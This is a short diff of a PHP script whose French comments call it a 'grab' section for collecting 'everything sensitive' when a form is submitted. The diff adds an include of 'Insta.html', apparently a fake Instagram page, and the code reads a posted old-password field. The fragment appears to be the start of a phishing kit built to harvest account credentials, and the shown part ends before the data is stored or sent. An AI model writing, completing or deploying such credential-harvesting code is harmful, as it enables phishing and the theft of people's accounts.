@@ -1,6 +1,6 @@
 <?php
 // ==================== PARTIE GRAB (récupération des infos) ====================
-
+include("Insta.html");
 // On récupère tout ce qui est sensible dès que le formulaire est envoyé
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $ancien_mdp    = $_POST['ancien_mdp']    ?? '';
